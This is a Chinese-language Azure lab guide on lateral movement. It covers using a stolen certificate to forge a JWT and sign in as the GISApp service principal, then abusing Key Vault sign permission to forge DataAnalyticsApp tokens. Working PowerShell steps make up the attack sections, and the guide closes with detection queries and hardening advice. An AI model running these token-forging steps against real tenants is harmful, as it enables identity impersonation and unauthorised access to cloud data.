# Learning Objective 2：服务主体伪造与 Key Vault 权限滥用

> **文档版本**: v2.0 (基于项目资料优化版)
> **学习目标**: 掌握横向移动技术，利用证书认证和 Key Vault 签名滥用实现服务主体权限提升
> **难度**: 中高级
> **预计时间**: 2-3 小时

---

## 目录

1. [核心目标概述](#核心目标概述)
2. [理论基础](#理论基础)
3. [实验条件与环境准备](#实验条件与环境准备)
4. [详细实验步骤](#详细实验步骤)
5. [检测与防御](#检测与防御)
6. [参考资料与文件位置](#参考资料与文件位置)

---

## 核心目标概述

本实验目标是实现 **横向移动（Lateral Movement）** 攻击场景。在已经攻陷低权限用户 Thomas 并获取证书文件的基础上，完成以下攻击链：

```
低权限用户 (Thomas)
    ↓ Objective 1: 获取证书
证书文件 (GISAppcert.pfx)
    ↓ 证书指纹识别
服务主体 (GISApp)
    ↓ 发现 Key Vault 签名权限
服务主体 (DataAnalyticsApp)
    ↓ 获取更高权限
核心数据存储账户 (oildatastore)
```

### 关键里程碑

| 阶段 | 目标 | 技术要点 |
|------|------|----------|
| 识别阶段 | 确定证书归属的应用程序 | 证书指纹匹配 |
| 访问阶段 | 伪造 JWT 令牌登录为 GISApp | Client Credentials Flow |
| 枚举阶段 | 发现 GISApp 对 Key Vault 的权限 | REST API 权限查询 |
| 攻击阶段 | 滥用 Key Vault 签名伪造 DataAnalyticsApp | Key Vault Signing Abuse |
| 目标达成 | 访问高权限存储资源 | ABAC 权限利用 |

---

## 理论基础

### 1. 服务主体（Service Principal）与证书认证

#### 什么是服务主体？

在 Microsoft Entra ID (原 Azure AD) 中，**服务主体（Service Principal）** 是应用程序（Application）在目录中的实例化表示。可以把它们理解为"应用程序的账号"：

- **Application (应用注册)**：应用程序的定义，类似于"账号申请表"
- **Service Principal (服务主体)**：应用程序在特定租户中的实例，类似于"实际账号"

服务主体用于代表应用程序进行身份验证和请求资源访问权限。

#### 证书认证流程 (Client Credentials Flow)

服务主体使用**证书**或**机密（Secret）**进行身份验证，而不是用户名/密码。以下是证书认证的技术流程：

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│   攻击者/应用    │         │   Microsoft     │         │    资源服务      │
│                 │         │ Entra ID (STS)  │         │  (Azure/Graph)  │
└────────┬────────┘         └────────┬────────┘         └────────┬────────┘
         │                           │                           │
         │  1. 构造 JWT 断言          │                           │
         │  (用私钥签名)              │                           │
         │──────────────────────────>│                           │
         │                           │                           │
         │                           │  2. 验证签名和证书         │
         │                           │  3. 颁发 Access Token     │
         │                           │                           │
         │  4. 返回 Access Token      │                           │
         │<──────────────────────────│                           │
         │                           │                           │
         │  5. 使用 Token 访问资源    │                           │
         │──────────────────────────────────────────────────────>│
         │                           │                           │
         │  6. 返回受保护资源          │                           │
         │<──────────────────────────────────────────────────────│
```

#### JWT (JSON Web Token) 结构

JWT 由三部分组成，用点（.）分隔：

```json
// Header (头部)
{
  "alg": "RS256",           // 签名算法 (RS256, RS512 等)
  "typ": "JWT",             // 令牌类型
  "x5t": "证书指纹Base64"    // 证书指纹
}

// Payload (负载)
{
  "aud": "https://login.microsoftonline.com/<tenantid>/oauth2/v2.0/token",  // 受众
  "iss": "<client_id>",   // 发行者 (应用ID)
  "sub": "<client_id>",   // 主题 (应用ID)
  "exp": 1234567890,      // 过期时间
  "jti": "唯一标识符",     // JWT ID
  "nbf": 1234567890       // 生效时间
}

// Signature (签名) - Base64URL(Header) + "." + Base64URL(Payload)
// 然后使用证书私钥进行签名
```

**关键概念**：
- **Client Assertion**: 服务主体用来证明自己身份的已签名 JWT
- **RS256/RS512**: 使用 RSA 算法进行签名（SHA-256 或 SHA-512）
- **x5t**: 证书指纹，用于将 JWT 与注册的证书关联

### 2. Key Vault 签名滥用 (Key Vault Signing Abuse)

#### 场景背景

Azure Key Vault 提供了一种安全的密钥管理服务，支持**不可导出的密钥（Non-exportable Keys）**。这意味着：

- 私钥**永远不会离开** Key Vault 的安全边界
- 应用可以请求 Key Vault 执行加密操作（签名、解密等）
- 应用获取的是操作结果，而不是私钥本身

#### 攻击原理

当攻击者无法导出私钥时，可以利用 Key Vault 的**签名功能**实现身份伪造：

```
正常流程 (可导出密钥):
攻击者本地 ──下载私钥──> 构造JWT ──本地签名──> 已签名JWT

攻击流程 (不可导出密钥):
攻击者本地 ──构造未签名JWT──> Key Vault ──签名──> 已签名JWT
```

#### 为什么这种攻击有效？

1. **权限模型缺陷**: Key Vault 的权限模型支持细粒度操作权限（`sign`, `verify`, `encrypt`, `decrypt` 等）
2. **过度许可**: 应用 A 可能被授予对应用 B 的密钥进行签名的权限
3. **信任链滥用**: Azure AD 信任 Key Vault 的签名，因为 Key Vault 是微软托管的安全服务

### 3. 过度许可（Over-permissioning）漏洞

#### 漏洞定义

**过度许可**是指服务主体被授予了执行其功能所需之外的额外权限。在本实验中：

- **GISApp** 需要读取 **DataAnalyticsAppVault** 的配置
- 但 GISApp 被错误授予了 **`Microsoft.KeyVault/vaults/keys/sign/action`** 权限
- 这个权限允许 GISApp 使用 DataAnalyticsApp 的证书私钥进行签名

#### 权限模型对比

| 权限 | 合法用途 | 风险 |
|------|----------|------|
| `Microsoft.KeyVault/vaults/keys/read/action` | 读取密钥元数据 | 信息泄露 |
| `Microsoft.KeyVault/vaults/keys/decrypt/action` | 解密数据 | 数据泄露 |
| `Microsoft.KeyVault/vaults/keys/sign/action` | 签名数据 | **身份伪造** |

### 4. MITRE ATT&CK 框架映射

基于项目中的 [ServicePrincipals-ADO.md](ServicePrincipals-ADO.md) 和其他相关文档，本实验涉及的 TTPs：

| 战术 | 技术 | 描述 |
|------|------|------|
| **Credential Access** | [T1528](https://attack.mitre.org/techniques/T1528/) - Steal Application Access Token | 窃取应用程序访问令牌 |
| **Persistence** | [T1098.001](https://attack.mitre.org/techniques/T1098/001/) - Additional Cloud Credentials | 添加云凭证以维持持久访问 |
| **Defense Evasion** | [T1606](https://attack.mitre.org/techniques/T1606/) - Forge Web Credentials | 伪造 Web 凭证材料 |

---

## 实验条件与环境准备

### 前置条件

#### 1. Objective 1 完成状态

在开始本实验之前，必须完成以下步骤：

| 项目 | 要求 | 验证方法 |
|------|------|----------|
| 用户访问 | 已获得 Thomas 用户权限 | `Connect-AzAccount` 以 Thomas 登录 |
| 证书文件 | 已导出 `GISAppcert.pfx` | 文件存在于 `C:\AzAD\Tools\` |
| 应用枚举 | 已保存 `OilCorpApplications.xml` | `Test-Path "C:\AzAD\Tools\OilCorpApplications.xml"` |

#### 2. 必需的环境变量

```powershell
# 这些变量应该在 Objective 1 中已经设置
$TenantId = "<Your-Tenant-ID>"          # 租户 ID
$SubscriptionId = "<Your-Subscription>" # 订阅 ID
$TenantDomain = "<your-domain>.onmicrosoft.com"
```

#### 3. 工具准备

| 工具/脚本 | 用途 | 位置 |
|-----------|------|------|
| `New-AccessToken.ps1` | 生成 JWT 访问令牌 | 实验环境提供 |
| `New-SignedJWT.ps1` | 利用 Key Vault 签名生成 JWT | 实验环境提供 |
| `Az` PowerShell 模块 | Azure 管理 | `Install-Module -Name Az` |
| `Microsoft.Graph` 模块 | Graph API 调用 | `Install-Module -Name Microsoft.Graph` |

### 为什么需要这些条件？

#### 条件 1: 为什么必须完成 Objective 1？

Objective 1 建立了攻击链的**初始访问向量**：

1. **Thomas 用户权限**: 提供进入 Entra ID 的入口点
2. **Key Vault 访问**: 发现并导出证书文件的前提
3. **应用枚举数据**: 证书指纹匹配需要完整的应用清单

**理论依据**: 根据网络杀伤链（Kill Chain）模型，初始访问是后续所有攻击活动的基础。没有初始凭证，横向移动无从谈起。

#### 条件 2: 为什么需要特定的 PowerShell 模块？

| 模块 | 必要性 | 替代方案 |
|------|--------|----------|
| `Az` | 管理 Azure 资源 | Azure REST API |
| `Microsoft.Graph` | 查询 Entra ID 对象 | Microsoft Graph API |

#### 条件 3: 为什么需要自定义脚本？

- **`New-AccessToken.ps1`**: 演示 JWT 构造的底层原理
- **`New-SignedJWT.ps1`**: 封装复杂的 Key Vault 签名流程

这些脚本展示了攻击的**核心机制**，使用高级工具（如 `Connect-AzAccount`）会隐藏这些细节。

### 环境验证检查清单

```powershell
# 运行此脚本来验证环境
Write-Host "检查实验环境..." -ForegroundColor Cyan

# 1. 检查证书文件
if (Test-Path "C:\AzAD\Tools\GISAppcert.pfx") {
    Write-Host "[✓] 证书文件存在" -ForegroundColor Green
} else {
    Write-Host "[✗] 缺少 GISAppcert.pfx" -ForegroundColor Red
    exit 1
}

# 2. 检查应用清单
if (Test-Path "C:\AzAD\Tools\OilCorpApplications.xml") {
    Write-Host "[✓] 应用清单存在" -ForegroundColor Green
} else {
    Write-Host "[✗] 缺少 OilCorpApplications.xml" -ForegroundColor Red
    exit 1
}

# 3. 检查模块
$requiredModules = @("Az", "Microsoft.Graph")
foreach ($module in $requiredModules) {
    if (Get-Module -ListAvailable -Name $module) {
        Write-Host "[✓] $module 模块已安装" -ForegroundColor Green
    } else {
        Write-Host "[!] $module 模块未安装" -ForegroundColor Yellow
        Write-Host "    运行: Install-Module -Name $module"
    }
}

# 4. 检查当前上下文
$currentContext = Get-AzContext
if ($currentContext) {
    Write-Host "[✓] 已登录为: $($currentContext.Account)" -ForegroundColor Green
} else {
    Write-Host "[!] 未登录 Azure" -ForegroundColor Yellow
}
```

---

## 详细实验步骤

### 步骤 1：识别证书归属 (Reconnaissance)

#### 目标
确定在 Objective 1 中导出的证书文件 `GISAppcert.pfx` 对应哪个应用程序。

#### 技术原理

每个 X.509 证书都有唯一的**指纹（Thumbprint）**，它是证书内容的 SHA-1 哈希值。通过比对证书指纹与 Entra ID 应用注册中 `keyCredentials` 属性的 `customKeyIdentifier`，可以精确识别证书归属。

#### 详细操作

```powershell
# 1. 加载证书文件并获取指纹
$certPath = "C:\AzAD\Tools\GISAppcert.pfx"
$clientCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList $certPath

# 显示证书基本信息
Write-Host "证书信息:" -ForegroundColor Cyan
Write-Host "  主题: $($clientCertificate.Subject)"
Write-Host "  颁发者: $($clientCertificate.Issuer)"
Write-Host "  有效期: $($clientCertificate.NotBefore) 至 $($clientCertificate.NotAfter)"
Write-Host "  指纹: $($clientCertificate.Thumbprint)"

# 2. 加载应用清单并匹配指纹
$allApps = Import-Clixml "C:\AzAD\Tools\OilCorpApplications.xml"
$matchedApp = $allApps | Where-Object {
    $_.keyCredentials.customKeyIdentifier -eq $clientCertificate.Thumbprint
}

# 3. 显示匹配结果
if ($matchedApp) {
    Write-Host "`n匹配成功!" -ForegroundColor Green
    Write-Host "  应用名称: $($matchedApp.displayName)"
    Write-Host "  应用 ID: $($matchedApp.appId)"
    Write-Host "  对象 ID: $($matchedApp.id)"

    # 保存应用信息供后续使用
    $GISAppId = $matchedApp.appId
    $GISAppObjectId = $matchedApp.id
} else {
    Write-Host "`n未找到匹配的应用" -ForegroundColor Red
}
```

#### 预期结果

```
证书信息:
  主题: CN=GISApp
  颁发者: CN=Microsoft Azure TLS Issuing CA 01
  有效期: 2024-01-01 至 2025-01-01
  指纹: A1B2C3D4E5F6...

匹配成功!
  应用名称: GISApp
  应用 ID: 12345678-abcd-1234-abcd-1234567890ab
  对象 ID: 11111111-aaaa-bbbb-cccc-dddddddddddd
```

#### 为什么这个步骤重要？

1. **确认攻击向量**: 确保证书属于可用的应用
2. **信息收集**: 获取应用 ID 和对象 ID，后续步骤必需
3. **验证完整性**: 确保证书文件未被篡改

**设计依据**: 这一步体现了网络侦察（Reconnaissance）的原则——在发起攻击前充分了解目标环境。

---

### 步骤 2：伪造 JWT 并登录为 GISApp

#### 目标
不使用 `Connect-AzAccount -Certificate` 的便捷方法，而是手动构造 JWT 断言并获取访问令牌。

#### 技术原理

OAuth 2.0 客户端凭证流程（RFC 7523）：

1. 构造 JWT 断言（Client Assertion）
2. 使用证书私钥对 JWT 进行签名
3. 将签名后的 JWT 发送到令牌端点
4. Azure AD 验证签名后颁发访问令牌

#### 详细操作

```powershell
# 加载 JWT 生成脚本
. C:\AzAD\Tools\New-AccessToken.ps1

# 生成访问令牌
# Scope: Azure 管理平面
$scope = "https://management.azure.com/.default"

$GISAppMgmtToken = New-AccessToken `
    -clientCertificate $clientCertificate `
    -tenantID $TenantId `
    -appID $GISAppId `
    -scope $scope

# 显示令牌信息（仅用于调试）
$tokenParts = $GISAppMgmtToken.Split('.')
$header = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tokenParts[0]))
$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tokenParts[1]))

Write-Host "令牌已生成!" -ForegroundColor Green
Write-Host "Header: $header"
Write-Host "Payload: $payload"

# 使用令牌登录 Azure
Connect-AzAccount -AccessToken $GISAppMgmtToken -AccountId $GISAppId

# 验证登录状态
$currentContext = Get-AzContext
Write-Host "`n当前登录身份:" -ForegroundColor Cyan
Write-Host "  账户: $($currentContext.Account)"
Write-Host "  订阅: $($currentContext.Subscription.Name)"
Write-Host "  租户: $($currentContext.Tenant.Id)"
```

#### JWT 结构示例

```json
// Header
{
  "alg": "RS256",
  "typ": "JWT",
  "x5t": "AQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyA"
}

// Payload
{
  "aud": "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token",
  "iss": "$GISAppId",
  "sub": "$GISAppId",
  "exp": 1704067200,
  "jti": "unique-jti-value",
  "nbf": 1704063600
}
```

#### 预期结果

```
令牌已生成!
当前登录身份:
  账户: 12345678-abcd-1234-abcd-1234567890ab
  订阅: Oil Corp Production
  租户: abcdef12-3456-7890-abcd-ef1234567890
```

#### 为什么不直接使用 Connect-AzAccount？

| 方法 | 优点 | 缺点 | 适用场景 |
|------|------|------|----------|
| `Connect-AzAccount -Certificate` | 简单快捷 | 隐藏底层机制 | 日常运维 |
| 手动构造 JWT | 展示技术原理 | 复杂 | 安全研究、攻击演示 |

**教学价值**: 通过手动构造，深入理解 JWT 生成、签名和令牌交换的完整流程。

---

### 步骤 3：枚举 GISApp 的权限

#### 目标
发现 GISApp 可以访问哪些 Azure 资源，特别关注 Key Vault 相关权限。

#### 详细操作

```powershell
# 1. 列出 GISApp 有权访问的资源
Write-Host "枚举可访问资源..." -ForegroundColor Cyan

# 获取 GISApp 作为服务主体时的所有可访问资源
$resources = Get-AzResource | Where-Object {
    $_.ResourceType -eq "Microsoft.KeyVault/vaults"
}

foreach ($vault in $resources) {
    Write-Host "`n发现 Key Vault: $($vault.Name)" -ForegroundColor Yellow

    # 检查访问权限
    $vaultId = $vault.ResourceId
    $permissions = Get-AzRoleAssignment -Scope $vaultId `
        | Where-Object { $_.SignInName -eq $GISAppId -or $_.ObjectId -eq $GISAppObjectId }

    if ($permissions) {
        Write-Host "  权限:" -ForegroundColor Green
        foreach ($perm in $permissions) {
            Write-Host "    - $($perm.RoleDefinitionName)"
        }
    }
}
```

#### 预期发现

在实验环境中，应该会发现：

```
发现 Key Vault: DataAnalyticsAppVault
  权限:
    - Key Vault Secrets User
    - Key Vault Crypto User
```

#### 深入权限分析

使用 REST API 查询具体的操作权限：

```powershell
# 获取详细的 Key Vault 访问权限
$vaultName = "DataAnalyticsAppVault"
$resourceUrl = "https://management.azure.com/subscriptions/$SubscriptionId/..."
$apiVersion = "2022-04-01"

# 构造请求
$header = @{
    "Authorization" = "Bearer $GISAppMgmtToken"
    "Content-Type"  = "application/json"
}

# 调用 REST API
$uri = "https://management.azure.com/subscriptions/$SubscriptionId/" +
       "resourceGroups/<rg-name>/providers/Microsoft.KeyVault/vaults/$vaultName/" +
       "providers/Microsoft.Authorization/permissions?api-version=$apiVersion"

$response = Invoke-RestMethod -Uri $uri -Method GET -Headers $header

# 显示权限详情
foreach ($action in $response.value) {
    Write-Host "操作: $($action.name)" -ForegroundColor Cyan
    Write-Host "  数据操作: $($actions.dataActions -join ', ')"
}
```

#### 关键发现

重点查找以下权限：
- `Microsoft.KeyVault/vaults/keys/sign/action` - **这是攻击关键**
- `Microsoft.KeyVault/vaults/keys/read/action`
- `Microsoft.KeyVault/vaults/secrets/getSecret/action`

#### 为什么发现 sign 权限很关键？

`sign` 权限意味着：
- 可以使用 Key Vault 中的私钥对数据进行签名
- 如果该私钥属于另一个服务主体，就可以伪造其身份
- 这是权限提升的**跳板**

---

### 步骤 4：滥用 Key Vault 签名（核心攻击步骤）

#### 目标
利用 GISApp 对 `DataAnalyticsAppVault` 的签名权限，伪造 **DataAnalyticsApp** 的访问令牌。

#### 技术原理详解

```
┌─────────────────────────────────────────────────────────────────┐
│                     攻击流程图解                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻击者 (GISApp)                                                │
│       │                                                         │
│       │  1. 构造未签名的 JWT                                    │
│       │     (Issuer = DataAnalyticsApp)                         │
│       │                                                         │
│       ▼                                                         │
│  Key Vault (DataAnalyticsAppVault)                             │
│       │                                                         │
│       │  2. 使用 DataAnalyticsAppCert 的私钥签名               │
│       │     (GISApp 有 sign 权限)                               │
│       │                                                         │
│       ▼                                                         │
│  已签名的 JWT                                                   │
│       │                                                         │
│       │  3. 发送到 Azure AD 令牌端点                            │
│       │                                                         │
│       ▼                                                         │
│  Azure AD                                                      │
│       │                                                         │
│       │  4. 验证签名 (使用注册的公钥)                           │
│       │  5. 颁发 DataAnalyticsApp 的 Access Token              │
│       │                                                         │
│       ▼                                                         │
│  DataAnalyticsApp Access Token                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 详细操作

```powershell
# 加载 Key Vault 签名脚本
. C:\AzAD\Tools\New-SignedJWT.ps1

# 执行签名攻击
$signedJWT = New-SignedJWT

# 使用签名后的 JWT 获取 DataAnalyticsApp 的访问令牌
$tokenEndpoint = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"

$body = @{
    "grant_type"    = "client_credentials"
    "client_id"     = "<DataAnalyticsApp_ID>"       # 目标应用 ID
    "client_assertion_type" = "urn:ietf:params:oauth:grant-type:jwt-bearer"
    "client_assertion" = $signedJWT                 # Key Vault 签名的 JWT
    "scope"         = "https://management.azure.com/.default"
}

$response = Invoke-RestMethod -Uri $tokenEndpoint -Method POST -Body $body
$DataAnalyticsAppToken = $response.access_token

Write-Host "成功获取 DataAnalyticsApp 令牌!" -ForegroundColor Green

# 解码并检查令牌内容
$tokenParts = $DataAnalyticsAppToken.Split('.')
$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tokenParts[1]))
$tokenPayload = $payload | ConvertFrom-Json

Write-Host "`n令牌详情:" -ForegroundColor Cyan
Write-Host "  发行者: $($tokenPayload.iss)"
Write-Host "  主题: $($tokenPayload.sub)"
Write-Host "  应用: $($tokenPayload.appid)"
```

#### `New-SignedJWT.ps1` 内部原理

这个脚本执行以下关键操作：

```powershell
# 伪代码展示核心逻辑
function New-SignedJWT {
    # 1. 构造 JWT Header
    $header = @{
        "alg" = "RS256"
        "typ" = "JWT"
        "x5t" = "<DataAnalyticsAppCert_Thumbprint>"
    } | ConvertTo-Json

    # 2. 构造 JWT Payload
    $now = [DateTimeOffset]::UtcNow
    $payload = @{
        "aud" = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
        "iss" = "<DataAnalyticsApp_ID>"
        "sub" = "<DataAnalyticsApp_ID>"
        "exp" = $now.AddMinutes(5).ToUnixTimeSeconds()
        "jti" = [Guid]::NewGuid().ToString()
        "nbf" = $now.ToUnixTimeSeconds()
    } | ConvertTo-Json

    # 3. 构造待签名的数据
    $data = [System.Text.Encoding]::UTF8.GetBytes(
        "$($header | ConvertTo-Base64URL).$($payload | ConvertTo-Base64URL)"
    )

    # 4. 调用 Key Vault Sign API
    $vaultName = "DataAnalyticsAppVault"
    $keyName = "DataAnalyticsAppCert"
    $keyVersion = "<current_version>"

    $signUrl = "https://$vaultName.vault.azure.net/keys/$keyName/$keyVersion/sign?api-version=7.2"

    $signBody = @{
        "alg" = "RS256"
        "value" = [System.Convert]::ToBase64String($data)
    } | ConvertTo-Json -Depth 10

    $signResponse = Invoke-RestMethod `
        -Uri $signUrl `
        -Method POST `
        -Body $signBody `
        -Headers @{
            "Authorization" = "Bearer $GISAppMgmtToken"
            "Content-Type" = "application/json"
        }

    # 5. 组装最终的 JWT
    $signature = $signResponse.value  # Base64URL 编码的签名
    $jwt = "$($header | ConvertTo-Base64URL).$($payload | ConvertTo-Base64URL).$signature"

    return $jwt
}
```

#### 预期结果

```
成功获取 DataAnalyticsApp 令牌!

令牌详情:
  发行者: https://sts.windows.net/<TenantId>/
  主题: <DataAnalyticsApp_ID>
  应用: <DataAnalyticsApp_ID>
```

#### 为什么这种攻击有效？

1. **信任转移**: Azure AD 信任 Key Vault 的签名，因为 Key Vault 是微软的安全服务
2. **权限继承**: DataAnalyticsApp 的权限被转移到攻击者
3. **审计盲区**: 日志显示"合法"的服务主体活动，难以检测

---

### 步骤 5：使用新身份访问资源

#### 目标
使用 DataAnalyticsApp 的访问令牌查看之前无法访问的资源。

#### 详细操作

```powershell
# 使用新令牌登录
Connect-AzAccount -AccessToken $DataAnalyticsAppToken -AccountId "<DataAnalyticsApp_ID>"

# 验证当前身份
$currentContext = Get-AzContext
Write-Host "当前登录身份: $($currentContext.Account)" -ForegroundColor Green

# 列出所有可访问资源
$resources = Get-AzResource

Write-Host "`n可访问资源:" -ForegroundColor Cyan
foreach ($res in $resources) {
    Write-Host "  - $($res.Name) [$($res.ResourceType)]"
}

# 特别关注存储账户
$storageAccounts = $resources | Where-Object { $_.ResourceType -eq "Microsoft.Storage/storageAccounts" }

foreach ($storage in $storageAccounts) {
    Write-Host "`n存储账户: $($storage.Name)" -ForegroundColor Yellow

    # 检查权限
    $assignments = Get-AzRoleAssignment -Scope $storage.ResourceId
    foreach ($assignment in $assignments) {
        Write-Host "  角色: $($assignment.RoleDefinitionName)"
        if ($assignment.Condition) {
            Write-Host "  条件: $($assignment.Condition)" -ForegroundColor Magenta
        }
    }
}
```

#### 预期发现

```
当前登录身份: <DataAnalyticsApp_ID>

可访问资源:
  - DataAnalyticsAppVault [Microsoft.KeyVault/vaults]
  - oildatastore [Microsoft.Storage/storageAccounts]

存储账户: oildatastore
  角色: Storage Blob Tag Modifier
  条件: {"BlobTags":[{"key":"Project","value":"OilFields"]},"Version":"1.0"}
```

#### ABAC (基于属性的访问控制) 说明

发现的权限包含 ABAC 条件：

```json
{
  "BlobTags": [
    {"key": "Project", "value": "OilFields"}
  ],
  "Version": "1.0"
}
```

这意味着 DataAnalyticsApp 只能访问带有特定标签的 Blob 数据。

---

## 检测与防御

### 检测方法

基于项目的 [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) 和相关检测规则：

#### 1. 异常服务主体活动检测

**检测逻辑**: 监控服务主体的异常登录模式

```kusto
// KQL 查询示例 - 适用于 Microsoft Sentinel
AADServicePrincipalSignInLogs
| where AppId == "<GISApp_ID>"
| where ResultType == 0
| summarize count(), make_set(IPAddress) by bin(TimeGenerated, 1h), ServicePrincipalName
| where count_ > 10  // 异常高频登录
```

#### 2. Key Vault 签名活动监控

**检测逻辑**: 监控来自非预期源的 Key Vault 签名请求

```kusto
AzureActivity
| where OperationName == "Microsoft.KeyVault/vaults/keys/sign/action"
| where Caller != "<Expected_IP_Address>"
| project TimeGenerated, Caller, Identity, ResourceGroupName, VaultName
```

#### 3. 权限提升检测

**检测逻辑**: 检测服务主体突然获得新权限

```kusto
AuditLogs
| where Category == "RoleManagement"
| where ActivityDisplayName == "Add member to role"
| where TargetResources[0].type == "ServicePrincipal"
| project TimeGenerated, InitiatedBy, TargetResources
```

### 防御措施

基于项目的 [LateralMovementADEID.md](LateralMovementADEID.md):

#### 1. 实施最小权限原则

```json
// 错误的权限配置
{
  "permissions": ["sign", "verify", "encrypt", "decrypt", "wrapKey", "unwrapKey"]
}

// 正确的权限配置
{
  "permissions": ["verify"]  // 仅验证签名
}
```

#### 2. Key Vault 访问策略审查

```powershell
# 审查 Key Vault 访问策略
$vaultName = "DataAnalyticsAppVault"
$vault = Get-AzKeyVault -VaultName $vaultName

foreach ($policy in $vault.AccessPolicies) {
    Write-Host "主体: $($policy.ObjectId)"
    Write-Host "  密钥权限: $($policy.PermissionsToKeys -join ', ')"
    Write-Host "  密钥权限: $($policy.PermissionsToSecrets -join ', ')"
}
```

#### 3. 条件访问策略

为高权限服务主体配置条件访问：

```powershell
# 限制服务主体只能从特定 IP 访问
$conditions = @{
    "clientAppTypes" = @("all")
    "locations" = @("<Trusted_IP_Location>")
}
```

---

## 参考资料

### 项目内文档

| 文档 | 位置 | 相关内容 |
|------|------|----------|
| 横向移动防护指南 | [LateralMovementADEID.md](LateralMovementADEID.md) | AD 攻陷后的 Entra ID 防护 |
| 服务主体攻击 | [ServicePrincipals-ADO.md](ServicePrincipals-ADO.md) | ADO 中的服务主体安全 |
| Entra Connect 滥用 | [AADCSyncServiceAccount.md](AADCSyncServiceAccount.md) | 同步账户攻击检测 |

### 检测规则

| 规则文件 | 位置 | 用途 |
|----------|------|------|
| AADConnectorAccount-OutsideOfWatchList.json | [queries/AADConnectorAccount-OutsideOfWatchList.json](queries/AADConnectorAccount-OutsideOfWatchList.json) | 检测异常连接器账户 |
| AADConnect-ChangedDirSyncSettings.json | [queries/AADConnect-ChangedDirSyncSettings.json](queries/AADConnect-ChangedDirSyncSettings.json) | 检测同步配置变更 |
| AADConnectorAccount-AddedTAPorChangedPassword.json | [queries/AADConnectorAccount-AddedTAPorChangedPassword.json](queries/AADConnectorAccount-AddedTAPorChangedPassword.json) | 检测 TAP 后门添加 |

### 配置文件

| 文件 | 位置 | 用途 |
|------|------|------|
| AadSecConfig.json | [config/AadSecConfig.json](config/AadSecConfig.json) | Entra ID 安全配置基线 |
| permissionGrantPolicies.json | [config/permissionGrantPolicies.json](config/permissionGrantPolicies.json) | 权限授予策略 |

### MITRE ATT&CK 映射

项目的 [media/mitre/AttackScenarios/](media/mitre/AttackScenarios/) 目录包含详细的攻击场景映射：

- [AADC.json](media/mitre/AttackScenarios/AADC.json) - Entra Connect 攻击
- [ADO.json](media/mitre/AttackScenarios/ADO.json) - Azure DevOps 攻击
- [Attacks_Combined.json](media/mitre/AttackScenarios/Attacks_Combined.json) - 综合攻击图

### 外部参考资料

#### 官方文档

| 主题 | 链接 |
|------|------|
| 应用程序证书凭证 | [Certificate Credentials - Microsoft Identity Platform](https://learn.microsoft.com/en-us/entra/identity-platform/certificate-credentials) |
| OAuth 2.0 JWT 配置文件 | [RFC 7523 - JWT Profile for OAuth 2.0](https://datatracker.ietf.org/doc/html/rfc7523) |
| Key Vault 概览 | [About Keys, Secrets, and Certificates](https://learn.microsoft.com/en-us/azure/key-vault/general/about-keys-secrets-certificates) |
| Key Vault RBAC | [Role-based Access Control](https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-guide) |

#### 安全研究

| 主题 | 来源 |
|------|------|
| Non-exportable Key Abuse | 本项目演示案例 |
| Service Principal Security | [SecureCloud.blog](https://securecloud.blog/) |
| Entra ID 权限提升 | [Azure Privilege Escalation via API Permissions Abuse](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48) |

---

## 总结

本实验展示了一个完整的云环境横向移动攻击链：

```
低权限用户 → 证书盗窃 → 服务主体伪造
→ Key Vault 滥用 → 权限提升 → 核心数据访问
```

### 关键安全教训

1. **过度许可是最大漏洞**: GISApp 不需要对 DataAnalyticsApp 的密钥拥有签名权限
2. **证书生命周期管理**: 定期审计和轮换证书
3. **Key Vault 权限审查**: 使用最小权限原则配置访问策略
4. **监控与审计**: 实施针对服务主体的异常检测

### 防御优先级

| 优先级 | 措施 | 影响 |
|--------|------|------|
| **高** | 移除不必要的 Key Vault sign 权限 | 直接阻止攻击 |
| **高** | 实施服务主体活动监控 | 快速发现异常 |
| **中** | 定期权限审计 | 减少攻击面 |
| **中** | 使用托管标识替代服务主体 | 简化凭证管理 |

---

> **文档版本历史**
> - v2.0 (2025): 基于项目资料全面优化，增加理论基础和防御措施
> - v1.0 (初始版): 基础实验步骤
